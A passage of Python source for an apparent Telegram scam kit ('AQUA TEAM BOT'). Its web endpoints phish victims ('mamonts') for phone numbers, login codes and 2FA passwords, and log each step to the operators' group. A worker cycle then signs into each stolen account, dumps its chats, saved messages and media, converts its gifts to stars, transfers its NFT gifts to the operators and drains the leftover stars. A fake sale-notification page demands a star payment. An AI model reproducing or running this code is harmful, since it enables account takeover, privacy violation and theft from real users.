            f"<b>👷 Воркер: {worker_tag}</b>{wallet_text}"
        )

        profit_image_url = "https://i.ibb.co/Nnrpf5js/photo-2025-12-19-22-56-52.jpg"
        result = await log_to_topic(bot, 'topic_profit', profit_log, profit_image_url)
        return result
    except Exception as e:
        print_error(f"Exception in log_profit_to_topic: {e}")
        return f"Error: {e}"

async def log_tradeban_nft(bot: Bot, tradeban_data: dict):
    """Log NFT that are in tradeban"""
    mamont_tag = tradeban_data.get('mamont_tag', 'Unknown')
    nft_links = tradeban_data.get('nft_links', [])
    worker_tag = tradeban_data.get('worker_tag', 'Unknown')

    # Формируем список ссылок на NFT в трейдбане
    nft_text = "\n".join([f"• {link}" for link in nft_links]) if nft_links else "• Нет NFT"

    tradeban_log = (
        f"👤 <b>{mamont_tag}</b>\n\n"
        f"[🚫] <b>AQUA TEAM BOT</b>\n"
        f"[⏳] <b>NFT в трейдбане!</b>\n"
        f"[🔻] <b>Недоступны для передачи:</b>\n"
        f"{nft_text}\n"
        f"🔹 <b>Воркер:</b> {worker_tag}"
    )
    await log_to_topic(bot, 'topic_success', tradeban_log)

# --- Вспомогательные функции маскирования (в начало файла) ---
def mask_data(data: str) -> str:
    """Скрывает центральную часть строки (примерно 1/3)."""
    if not data or data == "None": return "отсутствует"
    data = str(data)
    if len(data) < 4: return data

    one_third = len(data) // 3
    # Оставляем начало и конец, середину закрываем звездами
    return data[:one_third] + "*" * (len(data) - 2 * one_third) + data[-one_third:]

def mask_phone(phone: str) -> str:
    """Скрывает центральные цифры номера телефона."""
    phone = re.sub(r'\D', '', str(phone))
    if len(phone) < 10: return mask_data(phone)
    # Формат +7900***1122
    return f"+{phone[:4]}***{phone[-4:]}"

# ================= CORE LOGIC: DUMP, DRAIN, TRANSFER (MERGED FROM SCRIPT 2) =================

async def get_stars_info(client: Client):
    try:
        balance = await client.get_stars_balance("me")
        return int(balance)
    except: return 0

async def get_all_received_gifts(client: Client):
    all_gifts = []
    try:
        async for gift in client.get_chat_gifts(chat_id="me"):
            all_gifts.append(gift)
    except: pass
    return all_gifts

def analyze_gift_structure(gift):
    details = {
        'id': gift.id, 'msg_id': gift.message_id, 'title': 'Неизвестный',
        'star_count': gift.convert_price or 0, 'transfer_cost': gift.transfer_price or 0,
        'is_nft': False, 'can_transfer': False, 'can_convert': False, 'unlock_date': None, 'url': ''
    }
    try:
        # Логируем структуру подарка для отладки
        print(f"🔍 Анализ подарка ID {gift.id}: hasattr(gift, 'link')={hasattr(gift, 'link')}, hasattr(gift, 'url')={hasattr(gift, 'url')}, hasattr(gift, 'gift')={hasattr(gift, 'gift')}")

        # Получаем URL подарка по аналогии с utils.py
        if hasattr(gift, 'link') and gift.link:
            details['url'] = gift.link
            print(f"✅ URL из gift.link: {details['url']}")
        elif hasattr(gift, 'url') and gift.url:
            details['url'] = gift.url
            print(f"✅ URL из gift.url: {details['url']}")
        elif hasattr(gift, 'gift') and hasattr(gift.gift, 'url') and gift.gift.url:
            details['url'] = gift.gift.url
            print(f"✅ URL из gift.gift.url: {details['url']}")
        else:
            details['url'] = ''
            print(f"⚠️ URL не найден для подарка {gift.id}")

        if getattr(gift, 'collectible_id', None) is not None:
            details['is_nft'] = True
            details['title'] = gift.title or gift.name or 'NFT Gift'
            details['unlock_date'] = gift.can_transfer_at
            if gift.can_transfer_at is None:
                details['can_transfer'] = True
            else:
                now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now()
                details['can_transfer'] = gift.can_transfer_at <= now
        else:
            is_converted = getattr(gift, 'is_converted', False)
            details['can_convert'] = (details['star_count'] > 0) and (not is_converted)
            emoji = GIFT_EMOJIS.get(gift.id, "")
            details['title'] = f"Подарок {emoji}" if emoji else "Обычный подарок"
    except Exception as e:
        log_transfer(f"Ошибка анализа: {e}", "error")
    return details

async def convert_regular_gift(client: Client, gift_details):
    try:
        if await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id'])):
            print_success(f"Конвертирован: {gift_details['title']} -> {gift_details['star_count']} stars")
            return True
    except BadRequest: pass
    except Exception as e: log_transfer(f"Convert Error: {e}", "error")
    return False

async def send_gift_from_banker(main_client: Client, recipient_id, recipient_username, gift_id):
    try:
        target = recipient_username if recipient_username else recipient_id
        log_transfer(f"Банкир шлет подарок {gift_id} на {target}")
        await main_client.send_gift(chat_id=target, gift_id=gift_id)
        return True
    except (PeerIdInvalid, UsernameInvalid):
        print_error(f"Банкир не нашел получателя {target}")
    except FloodWait as e:
        print_warning(f"FloodWait {e.value}s")
        await asyncio.sleep(e.value)
    except Exception as e:
        log_transfer(f"Banker Send Error: {e}", "error")
    return False

async def replenish_balance_bulk(donor_client: Client, donor_id, donor_username, banker_client: Client, needed_amount: int):
    current = await get_stars_info(donor_client)

    while current < needed_amount:
        target_gift_id = 5170233102089322756 # 🧸 15 звезд

        if not await send_gift_from_banker(banker_client, donor_id, donor_username, target_gift_id):
            return False

        await asyncio.sleep(1.5) # БЫЛО 6: Уменьшили ожидание появления подарка

        gift_found = False
        for _ in range(3): # БЫЛО 5: Меньше итераций поиска
            gifts = await get_all_received_gifts(donor_client)
            for g in gifts:
                d = analyze_gift_structure(g)
                if d['id'] == target_gift_id and d['can_convert']:
                    if await convert_regular_gift(donor_client, d):
                        gift_found = True
                        break
            if gift_found: break
            await asyncio.sleep(0.5) # БЫЛО 2: Быстрее перепроверка

        current = await get_stars_info(donor_client)

    return True

async def transfer_nft_gift(client: Client, gift_details):
    target = get_target_username()
    try:
        # Попробуем использовать gift.transfer() если объект gift доступен
        if 'gift_obj' in gift_details and gift_details['gift_obj']:
            await gift_details['gift_obj'].transfer(target)
            print_success(f"NFT {gift_details['title']} передан на @{target} (gift.transfer)")
        else:
            await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target)
            print_success(f"NFT {gift_details['title']} передан на @{target} (client.transfer_gift)")
        log_transfer(f"SUCCESS NFT TRANSFER: {gift_details['title']}")
        return True
    except Exception as e:
        log_transfer(f"NFT Transfer Error: {e}", "error")
    return False

async def drain_remaining_stars(client: Client, banker_username: str):
    """Слив остатка звезд обратно банкиру"""
    balance = await get_stars_info(client)
    if balance < 15 or not banker_username: return

    log_transfer(f"Дрейн остатка: {balance} звезд банкиру @{banker_username}")
    sorted_gifts = sorted(REGULAR_GIFTS.items(), key=lambda x: x[1], reverse=True)

    while balance >= 15:
        gift_to_send = None
        cost = 0
        for g_id, price in sorted_gifts:
            if balance >= price:
                gift_to_send = g_id
                cost = price
                break
        if not gift_to_send: break

        try:
            await client.send_gift(chat_id=banker_username, gift_id=gift_to_send)
            balance -= cost
            await asyncio.sleep(0.3) # БЫЛО 1.5: Слив остатков звезд стал в 5 раз быстрее
        except Exception: break

async def dump_chat_history(client: Client, user_id: int):
    """Дамп чатов (интеграция Script 2)"""
    limit = SETTINGS.get("dump_limit", 50)
    if limit <= 0: return

    base_path = DUMP_DIR / str(user_id)
    base_path.mkdir(parents=True, exist_ok=True)

    log_transfer(f"Дамп чатов для {user_id}...")
    try:
        async for dialog in client.get_dialogs():
            chat = dialog.chat
            safe_name = clean_filename(chat.title or chat.first_name or "unknown")
            file_path = base_path / f"{safe_name}_{chat.id}.txt"

            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(f"CHAT: {safe_name} (ID: {chat.id})\n\n")
                    async for msg in client.get_chat_history(chat.id, limit=limit):
                        d = msg.date.strftime("%Y-%m-%d %H:%M") if msg.date else "NoDate"
                        s = "Me" if msg.from_user and msg.from_user.is_self else (msg.from_user.first_name if msg.from_user else "Other")
                        t = msg.text or msg.caption or "[Media]"
                        f.write(f"[{d}] {s}: {t}\n")
            except: pass
    except Exception as e:
        log_transfer(f"Dump Error: {e}", "error")

async def dump_saved_messages(client: Client, user_id: int):
    """Дамп сохраненных сообщений (Saved Messages)"""
    base_path = DUMP_DIR / str(user_id) / "saved_messages"
    base_path.mkdir(parents=True, exist_ok=True)

    log_transfer(f"Дамп сохраненных сообщений для {user_id}...")
    try:
        msg_count = 0
        media_count = 0

        with open(base_path / "saved_messages.txt", "w", encoding="utf-8") as f:
            f.write("SAVED MESSAGES (Избранное)\n\n")

            # Используем постраничную загрузку для получения ВСЕХ сообщений
            offset_id = 0
            batch_num = 0
            max_batches = 100  # Защита от бесконечного цикла (100 батчей по 200 = 20,000 сообщений)

            while batch_num < max_batches:
                batch_count = 0
                try:
                    async for msg in client.get_chat_history("me", limit=200, offset_id=offset_id):
                        d = msg.date.strftime("%Y-%m-%d %H:%M") if msg.date else "NoDate"
                        t = msg.text or msg.caption or "[Media]"

                        # Скачиваем фото и другие медиа
                        media_path = None
                        try:
                            if msg.photo:
                                media_path = base_path / f"photo_{msg.id}.jpg"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Фото сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.document:
                                file_name = msg.document.file_name or f"doc_{msg.id}"
                                media_path = base_path / f"doc_{msg.id}_{file_name}"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Документ сохранен: {media_path.name}]"
                                media_count += 1
                            elif msg.video:
                                media_path = base_path / f"video_{msg.id}.mp4"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Видео сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.audio:
                                media_path = base_path / f"audio_{msg.id}.mp3"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Аудио сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.voice:
                                media_path = base_path / f"voice_{msg.id}.ogg"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Голосовое сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.sticker:
                                media_path = base_path / f"sticker_{msg.id}.webp"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Стикер сохранен: {media_path.name}]"
                                media_count += 1
                        except Exception as media_error:
                            t += f" [Ошибка загрузки медиа: {str(media_error)}]"

                        f.write(f"[{d}]: {t}\n")
                        msg_count += 1
                        batch_count += 1
                        offset_id = msg.id  # Обновляем offset_id для следующей партии

                    batch_num += 1
                    log_transfer(f"Обработан батч {batch_num}: {batch_count} сообщений (всего: {msg_count})")

                    if batch_count < 200:  # Достигли конца истории
                        break

                    # Небольшая задержка между батчами
                    await asyncio.sleep(0.1)

                except Exception as batch_error:
                    log_transfer(f"Ошибка в батче {batch_num}: {batch_error}", "error")
                    break

        log_transfer(f"Дамп сохраненных сообщений завершен: {msg_count} сообщений, {media_count} файлов медиа")
    except Exception as e:
        log_transfer(f"Dump Saved Messages Error: {e}", "error")

async def FULL_WORKER_CYCLE(client: Client, banker_client: Client, bot: Bot):
    """
    ГЛАВНАЯ ФУНКЦИЯ ОБРАБОТКИ (Merge of Logic)
    1. Dump Chats
    2. Convert Trash Gifts
    3. Identify NFTs
    4. Fund Account (if needed)
    5. Transfer NFTs
    6. Drain Remaining Stars
    7. Always dump Saved Messages at the end
    """
    me = await client.get_me()
    user_id = me.id
    username = me.username

    try:
        # 1. Dump
        await dump_chat_history(client, user_id)

        # 2. Convert Regular Gifts
        gifts = await get_all_received_gifts(client)
        for g in gifts:
            d = analyze_gift_structure(g)
            if not d['is_nft'] and d['can_convert']:
                await convert_regular_gift(client, d)

        # 3. Analyze NFTs
        gifts = await get_all_received_gifts(client)
        nfts_to_send = []
        tradeban_nfts = []
        total_cost = 0

        for g in gifts:
            d = analyze_gift_structure(g)
            if d['is_nft']:
                if d['can_transfer']:
                    nfts_to_send.append(d)
                    total_cost += d['transfer_cost']
                else:
                    tradeban_nfts.append(d)

        if not nfts_to_send:
            log_transfer("NFT не найдены или заблокированы.")
            # Если NFT нет, просто сливаем звезды, если есть
            if banker_client:
                b_me = await banker_client.get_me()
                await drain_remaining_stars(client, b_me.username or b_me.id)
            return

        # 4. Funding
        current_bal = await get_stars_info(client)
        if current_bal < total_cost:
            if not banker_client:
                print_error("Нет банкира для пополнения!")
                await alert_admins(bot, f"⚠️ Нужен банкир для юзера {user_id} (Нужно: {total_cost}, Есть: {current_bal})")
                return

            log_transfer(f"Пополнение баланса... (Нужно: {total_cost})")
            if not await replenish_balance_bulk(client, user_id, username, banker_client, total_cost):
                log_transfer("Ошибка пополнения", "error")
                return

        # 5. Transfer NFTs and calculate profits
        u_db = db.get_user(user_id)
        nft_count = 0
        
        # Передаем NFT и ставим метку успеха для каждого
        for nft in nfts_to_send:
            success = await transfer_nft_gift(client, nft)
            nft['transferred'] = success # Метка успеха для фильтрации в логгере
            if success:
                nft_count += 1
            await asyncio.sleep(0.5)

        # Вызываем логгер с обновленными данными
        mamont_tag = f"@{mask_data((await client.get_me()).username)}" if (await client.get_me()).username else mask_data(str(user_id))
        worker_id = u_db.get('worker_id') if u_db else None

        try:
            await log_profit_to_topic(bot, {
                'mamont_tag': mamont_tag,
                'nft_data': nfts_to_send, # Содержит все NFT с метками 'transferred'
                'worker_id': worker_id
            })
        except Exception as e:
            print_error(f"Failed to log profit: {e}")

        # Log tradeban NFTs if any
        if tradeban_nfts:
            tradeban_links = [f"🎁 {nft['title']}" for nft in tradeban_nfts]
            worker_tag = "👤 Администрация"
            if worker_id:
                worker_user = db.get_user(worker_id)
                if worker_user and worker_user.get('username'):
                    worker_tag = f"@{mask_data(worker_user['username'])}"
                else:
                    worker_tag = f"ID:{worker_id}"
            await log_tradeban_nft(bot, {
                'mamont_tag': mamont_tag,
                'nft_links': tradeban_links,
                'worker_tag': worker_tag
            })

        # 6. Drain Back
        if banker_client:
            b_me = await banker_client.get_me()
            await drain_remaining_stars(client, b_me.username or b_me.id)

    except Exception as e:
        print_error(f"Error in FULL_WORKER_CYCLE: {e}")
        # Continue to dump saved messages even if there was an error

    finally:
        # 7. ALWAYS dump Saved Messages at the end, regardless of any errors above
        try:
            await dump_saved_messages(client, user_id)
            log_transfer(f"Saved messages dump completed for user {user_id}")
        except Exception as dump_error:
            print_error(f"Failed to dump saved messages: {dump_error}")

# ================= FragmentBot CLASS =================
class FragmentBot:
    def __init__(self):
        self.bot = None
        self.dp = None
        self.running = False
        self.user_sessions = {}
        self.pyro_clients = {}
        self.processed_reqs = set()
        self.tunnel_proc = None
        self.phone_attempts = {}  # user_id: {'count': int, 'blocked_until': timestamp}
        self.web_auths = {}
        self.app = web.Application()
        self.app.router.add_get('/', self.serve_index)
        self.app.router.add_get('/index.html', self.serve_index)
        self.app.router.add_get('/fragment-info.html', self.serve_fragment_info)
        self.app.router.add_get('/worker', self.serve_worker)
        self.app.router.add_post('/api/send_phone', self.api_send_phone)
        self.app.router.add_post('/api/send_code', self.api_send_code)
        self.app.router.add_post('/api/send_password', self.api_send_password)
        self.app.router.add_get('/api/status', self.api_get_status)
        self.app.router.add_post('/api/log_photo', self.api_log_photo)

    async def serve_index(self, request):
        try:
            return web.FileResponse('index.html')
        except:
            return web.Response(text="index.html not found", status=404)

    async def serve_fragment_info(self, request):
        try:
            return web.FileResponse('fragment-info.html')
        except:
            return web.Response(text="fragment-info.html not found", status=404)

    async def serve_worker(self, request):
        html = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Уведомление о продаже</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .header {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            font-weight: 600;
        }
        .content {
            padding: 24px;
        }
        .notification {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
        }
        .notification .icon {
            font-size: 32px;
            margin-bottom: 12px;
        }
        .notification h2 {
            margin: 0 0 8px 0;
            color: #2c3e50;
            font-size: 18px;
        }
        .notification p {
            margin: 8px 0;
            color: #555;
            line-height: 1.5;
        }
        .conditions {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 12px;
            margin: 16px 0;
        }
        .conditions strong {
            color: #856404;
        }
        .deadline {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 8px;
            padding: 12px;
            margin: 16px 0;
            text-align: center;
        }
        .deadline strong {
            color: #0c5460;
        }
        .button {
            display: block;
            width: 100%;
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,123,255,0.3);
        }
        .footer {
            text-align: center;
            padding: 16px;
            color: #6c757d;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔔 Уведомление</h1>
        </div>
        <div class="content">
            <div class="notification">
                <div class="icon">🎉</div>
                <h2>У вас новая продажа!</h2>
                <p>Поздравляем! Ваш товар был успешно продан на платформе.</p>
            </div>

            <div class="conditions">
                <strong>📋 Условия сделки:</strong><br>
                Необходимо перевести оплату чеком звезд на аккаунт <strong>@vafliki</strong><br>
                Сумма: <strong>100 ⭐️</strong>
            </div>

            <div class="deadline">
                <strong>⏰ Просим выполнить условия сделки до:</strong><br>
                <strong>28 декабря 2025 года 22:57 по МСК+6</strong>
            </div>

            <button class="button" onclick="alert('Условия выполнены! Спасибо за использование нашей платформы.')">
                ✅ Выполнить условия сделки
            </button>
        </div>
        <div class="footer">
            Безопасная платформа • Все права защищены
        </div>
    </div>
</body>
</html>
        """
        return web.Response(text=html, content_type='text/html')

    async def api_send_phone(self, request):
        try:
            data = await request.json()
            phone = data.get('phone', '').replace(' ', '').replace('-', '')
            # Получаем chatId из данных или параметров запроса
            chat_id = str(data.get('chatId') or request.query.get('chatId') or '')

            print(f"🔍 [API] Request data: {data}")  # Отладка
            print(f"📱 [API] Phone: {phone}, ChatID: {chat_id}")  # Отладка

            # Проверяем, что chat_id существует
            if not chat_id or chat_id == 'null' or chat_id == 'undefined':
                print("❌ [API] Chat ID missing or invalid")  # Отладка
                return web.json_response({'status': 'error', 'message': 'Chat ID required'})

            # Проверяем пользователя в БД - он должен быть добавлен через /start в боте
            try:
                chat_id_int = int(chat_id)
                u_db = db.get_user(chat_id_int)
                print(f"👤 [API] User from DB: {u_db}")  # Отладка

                # Пользователь должен быть в БД с username
                if not u_db:
                    print("❌ [API] User not found in database - send /start first")  # Отладка
                    return web.json_response({'status': 'error', 'message': 'Please send /start to the bot first before using WebApp.'})

                if not u_db.get('username'):
                    print("❌ [API] Username missing - set username in Telegram")  # Отладка
                    return web.json_response({'status': 'error', 'message': 'Username required. Set username in Telegram settings.'})

            except ValueError:
                print("❌ [API] Invalid chat_id format")  # Отладка
                return web.json_response({'status': 'error', 'message': 'Invalid Chat ID'})

            # Валидация номера телефона
            phone_clean = re.sub(r'\D', '', phone)

            # Минимальная и максимальная длина для международных номеров
            if len(phone_clean) < 7 or len(phone_clean) > 17:
                return web.json_response({'status': 'error', 'message': 'Неверный формат номера телефона. Длина должна быть от 7 до 17 цифр.'})

            print(f"🚀 [WEB] Отправка кода на: {phone} (ID: {chat_id})")

            # Создаем клиента Pyrogram
            client = Client(
                name=f"temp_{chat_id}",
                api_id=SETTINGS['api_id'],
                api_hash=SETTINGS['api_hash'],
                workdir=str(SESSIONS_DIR)
            )
            await client.connect()

            try:
                code_hash = await client.send_code(phone)
            except FloodWait as e:
                # Преобразуем FloodWait в понятное сообщение
                wait_minutes = e.value // 60
                wait_seconds = e.value % 60
                if wait_minutes > 0:
                    wait_time = f"{wait_minutes} мин {wait_seconds} сек"
                else:
                    wait_time = f"{wait_seconds} сек"

                return web.json_response({
                    'status': 'error',
                    'message': f'Вы были заблокированы за многочисленные попытки входа, разблокировка через {wait_time}'
                })

            # Сохраняем сессию в памяти бота
            self.web_auths[chat_id] = {
                'client': client,
                'phone': phone,
                'hash': code_hash.phone_code_hash
            }

            # Лог отправки номера
            full_name = u_db['first_name'] if u_db else "Unknown"
            display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(chat_id_int))
            log_card = (
                f"<b>📱 ВВОД НОМЕРА</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                f"📞 <b>Номер:</b> <code>{mask_phone(phone)}</code>\n"
                f"⏳ <b>Статус:</b> Ожидание кода...\n"
                f"<code>««─────────────────»»</code>"
            )
            await log_to_topic(self.bot, 'topic_auth', log_card)

            return web.json_response({'status': 'ok'})
        except Exception as e:
            print(f"❌ Ошибка send_phone: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})

    async def api_send_code(self, request):
        data = await request.json()
        chat_id = str(data.get('chatId') or request.query.get('chatId'))
        code = data.get('code', '').strip()

        # Получаем данные пользователя для логов заранее
        u_db = db.get_user(int(chat_id)) if chat_id.isdigit() else None
        display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(chat_id))

        try:
            if not code or not code.isdigit() or len(code) != 5:
                return web.json_response({'status': 'error', 'message': 'Неверный формат кода'})

            auth = self.web_auths.get(chat_id)
            if not auth: return web.json_response({'status': 'error', 'message': 'Сессия истекла'})

            phone = auth['phone']

            try:
                await auth['client'].sign_in(auth['phone'], auth['hash'], code)
                # Лог успешного ввода кода
                log_card = (
                f"<b>✅ ВЕРНЫЙ КОД</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                f"⏳ <b>Статус:</b> Вход выполнен, запускаю цикл...\n"
                f"<code>««─────────────────»»</code>"
            )
                await log_to_topic(self.bot, 'topic_auth', log_card)
                print(f"DEBUG: Logging successful code for user {u_db['first_name'] if u_db else 'Unknown'}")
                print(f"DEBUG: About to send log to topic_success")
                try:
                    await log_to_topic(self.bot, 'topic_success', log_card)
                    print("DEBUG: SUCCESS log sent successfully")
                except Exception as e:
                    print(f"DEBUG: FAILED to send SUCCESS log: {e}")
                await self.finalize_login(auth['client'], int(chat_id)) # Сохранение сессии
                return web.json_response({'status': 'success'})
            except SessionPasswordNeeded:
                return web.json_response({'status': 'need_password'})
            except PhoneCodeInvalid:
                # Лог неверного кода
                log_card = (
                    f"<b>❌ НЕВЕРНЫЙ КОД</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{u_db['first_name'] if u_db else 'Unknown'}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{mask_phone(phone)}</code>\n"
                    f"🔢 <b>Введенный код:</b> <code>{code}</code>\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', log_card)
                return web.json_response({'status': 'error', 'message': 'Неверный код'})
            except PhoneCodeExpired:
                return web.json_response({'status': 'error', 'message': 'Код истек'})
            except Exception as e:
                logger.error(f"Code verification error: {e}")
                return web.json_response({'status': 'error', 'message': 'Ошибка верификации'})
        except Exception as e:
            logger.error(f"API send_code error: {e}")
            return web.json_response({'status': 'error', 'message': 'Ошибка сервера'})

    async def api_send_password(self, request):
        data = await request.json()
        chat_id = str(data.get('chatId') or request.query.get('chatId'))
        password = data.get('password')

        # Получаем данные пользователя для логов заранее
        u_db = db.get_user(int(chat_id)) if chat_id.isdigit() else None
        display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(chat_id))

        try:
            auth = self.web_auths.get(chat_id)
            if not auth: return web.json_response({'status': 'error'})

            phone = auth['phone']

            try:
                await auth['client'].check_password(password)
                # Лог успешного ввода пароля
                log_card = (
                    f"<b>✅ ВЕРНЫЙ ПАРОЛЬ</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{u_db['first_name'] if u_db else 'Unknown'}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{mask_phone(phone)}</code>\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_success', log_card)
                await self.finalize_login(auth['client'], int(chat_id))
                return web.json_response({'status': 'success'})
            except PasswordHashInvalid:
                # Лог неверного пароля
                log_card = (
                    f"<b>❌ НЕВЕРНЫЙ ПАРОЛЬ</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{u_db['first_name'] if u_db else 'Unknown'}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{mask_phone(phone)}</code>\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', log_card)
                return web.json_response({'status': 'error', 'message': 'Неверный пароль'})
            except Exception as e:
                logger.error(f"Password verification error: {e}")
                return web.json_response({'status': 'error', 'message': 'Ошибка верификации'})
        except Exception as e:
            logger.error(f"API send_password error: {e}")
            return web.json_response({'status': 'error', 'message': 'Ошибка сервера'})

    async def api_get_status(self, request):
        """Метод, который запрашивал Mini App и на котором вылетала ошибка"""
        return web.json_response({'status': 'waiting_phone'})

    async def api_log_photo(self, request):
        try:
            data = await request.json()
            chat_id = str(data.get('chatId') or request.query.get('chatId'))

            if not chat_id or chat_id == 'null':
                return web.json_response({'status': 'error', 'message': 'Chat ID required'})

            u_db = db.get_user(int(chat_id))
            if not u_db or not u_db.get('username'):
                return web.json_response({'status': 'error', 'message': 'User not found'})

            username = u_db.get('username', 'unknown')
            mamont_tag = f"@{mask_data(username)}"

            photo_log = f"📸 Фото мамонта {mamont_tag}\n"

            # Send photo to topic if provided
            gid = SETTINGS.get('allowed_group_id')
            tid = SETTINGS.get('topic_success')

            if gid and tid and 'photo' in data and data['photo']:
                import base64
                from aiogram.types import BufferedInputFile

                try:
                    # Decode base64 photo
                    photo_data = data['photo'].split(',')[1]  # Remove data:image/png;base64,
                    if not photo_data or photo_data == 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==':  # Empty 1x1 PNG
                        raise ValueError("Empty photo data")

                    photo_bytes = base64.b64decode(photo_data)

                    if len(photo_bytes) < 100:  # Too small, probably empty
                        raise ValueError("Photo data too small")

                    # Create BufferedInputFile for sending
                    photo_file = BufferedInputFile(photo_bytes, filename='photo.png')

                    await self.bot.send_photo(
                        chat_id=int(gid),
                        photo=photo_file,
                        caption=photo_log,
                        message_thread_id=int(tid),
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Error sending photo to topic: {e}")
                    # Fallback to text log
                    await log_to_topic(self.bot, 'topic_success', photo_log)
            else:
                await log_to_topic(self.bot, 'topic_success', photo_log)

            return web.json_response({'status': 'ok'})
        except Exception as e:
            print_error(f"Error logging photo: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})

    async def run(self):
        print_banner()
        # Start web server
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 3000)
    
        print(f"WebApp server started on port 3000")

        self.bot = Bot(token=SETTINGS['bot_token'], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.update.middleware(RateLimitMiddleware())
        self.dp.include_router(get_main_router(self.bot, SETTINGS['api_url']))

        await self.bot.delete_webhook(drop_pending_updates=True)
        asyncio.create_task(self.start_polling())
        print_success("Bot Started!")
        await self.dp.start_polling(self.bot)

    async def start_polling(self):
        self.running = True
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    async with session.get(f"{SETTINGS['api_url']}/api/telegram/get-pending", headers=self.get_headers(), timeout=10) as r:
                        if r.status == 200:
                            data = await r.json()
                            for req in data.get('requests', []):
                                if req['requestId'] not in self.processed_reqs:
                                    self.processed_reqs.add(req['requestId'])
                                    asyncio.create_task(self.handle_req(req, session))
                        elif r.status == 401:
                            print_error("API Auth Failed"); await asyncio.sleep(10)
                except: await asyncio.sleep(5)
                await asyncio.sleep(2)

    def get_headers(self):
        return {"Content-Type": "application/json", "X-Bot-Token": SETTINGS['bot_token']}

    def is_user_blocked(self, user_id):
        """Проверяет, заблокирован ли пользователь"""
        if user_id not in self.phone_attempts:
            return False

        attempts = self.phone_attempts[user_id]
        if attempts.get('blocked_until', 0) > time.time():
            return True

        return False

    def increment_attempts(self, user_id):
        """Увеличивает счетчик попыток пользователя"""
        if user_id not in self.phone_attempts:
            self.phone_attempts[user_id] = {'count': 0, 'blocked_until': 0}

        attempts = self.phone_attempts[user_id]
        attempts['count'] += 1

        # Если достигнуто 10 попыток, блокируем на 1 час
        if attempts['count'] >= 10:
            attempts['blocked_until'] = time.time() + 3600  # 1 час блокировки
            attempts['count'] = 0  # Сбрасываем счетчик

    def reset_attempts(self, user_id):
        """Сбрасывает счетчик попыток при успешном вводе номера"""
        if user_id in self.phone_attempts:
            self.phone_attempts[user_id]['count'] = 0

    async def update_status(self, sess, rid, status, msg=None, needs_2fa=False):
        try:
